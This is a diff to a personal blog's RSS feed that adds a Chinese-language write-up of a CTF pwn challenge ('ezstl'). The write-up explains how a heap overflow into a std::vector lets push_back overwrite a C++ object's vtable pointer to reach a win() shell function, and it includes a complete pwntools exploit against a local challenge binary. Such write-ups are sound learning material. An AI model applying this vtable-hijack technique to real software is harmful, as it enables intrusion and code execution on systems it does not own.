@@ -1,4 +1,254 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>ret2win,ret2libc的wp</title><link>https://dxfaker.top/posts/26moe6/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe6/</guid><description>啊啊啊啊啊事情好多啊</description><pubDate>Mon, 14 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>另类的STL利用的堆题</title><link>https://dxfaker.top/posts/heap1/</link><guid isPermaLink="true">https://dxfaker.top/posts/heap1/</guid><description>啊啊啊啊啊事情好多啊</description><pubDate>Tue, 15 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;一天写一题，我速度真够吧快!.jpg&lt;/h1&gt;
+&lt;p&gt;艾斯比吧&lt;/p&gt;
+&lt;h1&gt;ezstl&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt; checksec pwn
+[*] &apos;/mnt/d/ctf/flag/pwn/moectf/ezstl/pwn&apos;
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;哎呀，骇死我力！&lt;/p&gt;
+&lt;p&gt;不管，先shift+f12&lt;/p&gt;
+&lt;p&gt;找到后门&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;unsigned __int64 sub_1329()
+{
+  unsigned __int64 v1; // [rsp+8h] [rbp-8h]
+
+  v1 = __readfsqword(0x28u);
+  puts(&quot;admin badge&quot;);
+  system(&quot;/bin/sh&quot;);
+  return v1 - __readfsqword(0x28u);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;再看pwn.cpp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;cstdio&amp;gt;
+#include &amp;lt;cstdlib&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;vector&amp;gt;
+
+class Badge {
+public:
+   virtual void show()
+   {
+       puts(&quot;guest badge&quot;);
+   }
+};
+
+extern &quot;C&quot; void win()
+{
+   puts(&quot;admin badge&quot;);
+   system(&quot;/bin/sh&quot;);
+}
+
+struct Profile {
+   char name[0x30];
+   std::vector&amp;lt;void *&amp;gt; styles;
+   Badge badge;
+};
+
+struct StyleData {
+   void *slot[1];
+};
+
+struct HeapData {
+   Profile profile;
+   StyleData custom_style;
+};
+
+void setup()
+{
+   setvbuf(stdin, NULL, _IONBF, 0);
+   setvbuf(stdout, NULL, _IONBF, 0);
+   setvbuf(stderr, NULL, _IONBF, 0);
+   alarm(60);
+}
+
+unsigned long read_ulong()
+{
+   char buf[0x40] = {};
+   size_t i = 0;
+
+   while (i + 1 &amp;lt; sizeof(buf)) {
+       char ch = 0;
+       ssize_t n = read(0, &amp;amp;ch, 1);
+       if (n &amp;lt;= 0) {
+           exit(0);
+       }
+       if (ch == &apos;\n&apos;) {
+           break;
+       }
+       buf[i++] = ch;
+   }
+
+   return strtoul(buf, NULL, 0);
+}
+
+void add_style(Profile *profile, StyleData *style)
+{
+   profile-&amp;gt;styles.push_back(style);
+}
+
+void check_badge(Badge *badge)
+{
+   badge-&amp;gt;show();
+}
+
+int main()
+{
+   setup();
+
+   HeapData *data = new HeapData;
+   Profile *profile = &amp;amp;data-&amp;gt;profile;
+   StyleData *custom_style = &amp;amp;data-&amp;gt;custom_style;
+
+   puts(&quot;== pwn ==&quot;);
+   printf(&quot;profile: %p\n&quot;, profile);
+
+   printf(&quot;name: &quot;);
+   if (read(0, profile-&amp;gt;name, 0x48) &amp;lt;= 0) {
+       exit(0);
+   }
+
+   add_style(profile, custom_style);
+
+   printf(&quot;win: %p\n&quot;, (void *)win);
+   printf(&quot;style data: &quot;);
+   custom_style-&amp;gt;slot[0] = (void *)read_ulong();
+
+   puts(&quot;checking...&quot;);
+   check_badge(&amp;amp;profile-&amp;gt;badge);
+
+   _exit(0);
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;不过也还好，profile的真实地址是直接给的，利用IDA看偏移就可以算基址&lt;/p&gt;
+&lt;p&gt;这个题溢出还是挺明显的,但这个题的指针是虚指针&lt;/p&gt;
+&lt;p&gt;&lt;s&gt;两亿年没用过C艹以至于我已经忘记vector调用了，所以先恶补了一下&lt;/s&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;struct Profile {
+    char name[0x30];              // 第 1 个成员
+    std::vector&amp;lt;void *&amp;gt; styles;   // 第 2 个成员
+    Badge badge;                  // 第 3 个成员（Badge，有 virtual → 带 vptr）
+};
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;vector 对象本身 = 一个 3 指针的控制块，固定 0x18（24 字节）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;现在就是覆盖的事情了,0x30+0x18正好是0x48,还能顺便覆盖个vector&lt;/p&gt;
+&lt;p&gt;那覆盖掉vector对我有什么好处呢&lt;/p&gt;
+&lt;p&gt;那就得讲解一下vector了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;vector 对象布局（在 Profile 的 0x30~0x47）：
+  _M_start         (0x30)  8B
+  _M_finish        (0x38)  8B
+  _M_end_of_storage(0x40)  8B
+  合计 = 0x18
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;push_back&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;void push_back(const T&amp;amp; x) {
+    if (_M_finish != _M_end_of_storage) {   // 还有空位？
+        *_M_finish = x;                     //   ① 写到 _M_finish 指向的地址
+        ++_M_finish;                        //   ② 写指针后移
+    } else {
+        _M_realloc_insert(end(), x);        //   ③ 满了 → 重分配
+    }
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;_M_start         → 缓冲区第一个元素
+_M_finish        → 最后一个元素“之后”（下一个要写的位置）
+_M_end_of_storage → 已分配容量的“末尾”（再写就超了）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;push_back写入的地址就是_M_finish当前指向的地方，然后_M_end_of_storage视情况是否分配内存&lt;/p&gt;
+&lt;p&gt;那你想要跳转就得有执行或者指针跳转是吧，Profile溢出之后正好只能到达vector，且vector指针再怎么传入也不能执行跳转操作，那就得考虑另辟蹊径，通过观察也就引出了另外一个指针&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;class Badge {
+public:
+    virtual void show()        // ← 这个 virtual 就是关键
+    {
+        puts(&quot;guest badge&quot;);
+    }
+};
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;s&gt;我是懒鬼&lt;/s&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;C++ 规则：只要一个类声明了 virtual 成员函数（或继承了带虚函数的基类），编译器就会给这个类的每个对象自动插入一根隐藏的指针——虚指针（vptr），并额外生成一张“虚表（vtable）”。&lt;/p&gt;
+&lt;p&gt;源码里你看不到 vptr 的声明——它是编译器偷偷加的，不在你写的代码里。
+触发它存在的唯一条件就是 virtual。如果 show() 不带 virtual，Badge 就是个空类（0 字节，没有 vptr），badge-&amp;gt;show() 也会是直接调用（编译期绑定），那就没有可劫持的间接跳转了。&lt;/p&gt;
+&lt;p&gt;虚表（vtable）：每个类一张，存 show 等虚函数的地址。
+虚指针（vptr）：每个对象一根，指向自己类的虚表。Badge 没有其它数据成员，所以 vptr 就是它的全部内容，且位于对象最开头（偏移 0）。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Badge 只有一根 vptr、没有别的数据成员，所以 vptr 是对象的最开头（偏移 0）&lt;/p&gt;
+&lt;p&gt;所以badge的起始位置也就是指针的起始位置&lt;/p&gt;
+&lt;p&gt;那现在有指针了，那就可以利用这个指针进行跳转了&lt;/p&gt;
+&lt;p&gt;由于最后一步有写入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; check_badge(&amp;amp;profile-&amp;gt;badge);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;回顾他的结构&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;void check_badge(Badge *badge)
+{
+    badge-&amp;gt;show();
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;badge-&amp;gt;show();等价于&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;vtable = *(badge);            
+func   = *(vtable + 0);       
+func(badge);                
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;现在只需要想办法写入到这个虚指针就好了&lt;/p&gt;
+&lt;p&gt;那我们该怎么在payload里写呢&lt;/p&gt;
+&lt;p&gt;那么就是在填充字节后设置他的地址就好了&lt;/p&gt;
+&lt;p&gt;由于第一次打印会泄露出他的地址，所以要好好接住.jpg(我操，恶俗啊)&lt;/p&gt;
+&lt;p&gt;神必小约定:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;_M_start 改成任意值&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;finish必须指向profile+0x48&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;M_end_of_storage必须 &amp;gt; _M_finish（如 profile+0x50），否则走扩容分支，原语失效&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;第一轮把指针指向好了，第二轮就可以输入win了&lt;/p&gt;
+&lt;p&gt;下面是exp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+context.arch = &apos;amd64&apos;
+context.log_level = &apos;info&apos;
+
+io = remote(&apos;127.0.0.1&apos;, 63944)
+
+io.recvuntil(b&apos;profile: &apos;)
+profile = int(io.recvline().strip(), 16)
+
+payload  = b&apos;A&apos; * 0x30
+payload += p64(profile)            
+payload += p64(profile + 0x48)     
+payload += p64(profile + 0x50)    
+assert len(payload) == 0x48
+
+io.recvuntil(b&apos;name: &apos;)
+io.send(payload)                 
+
+io.recvuntil(b&apos;win: &apos;)
+win = int(io.recvline().strip(), 16)
+
+io.recvuntil(b&apos;style data: &apos;)
+io.sendline(str(win).encode())
+
+io.recvuntil(b&apos;checking...&apos;)
+io.interactive()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;初学好难搞，以至于将近一天我才好好参悟完一题(实则聊天看网课去了)&lt;/p&gt;
+</content:encoded></item><item><title>ret2win,ret2libc的wp</title><link>https://dxfaker.top/posts/26moe6/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe6/</guid><description>啊啊啊啊啊事情好多啊</description><pubDate>Mon, 14 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
 &lt;p&gt;此为第一版，貌似错误挺多的，后面再修吧&lt;/p&gt;
 &lt;h1&gt;omg电台炸了&lt;/h1&gt;
 &lt;p&gt;checksec&lt;/p&gt;
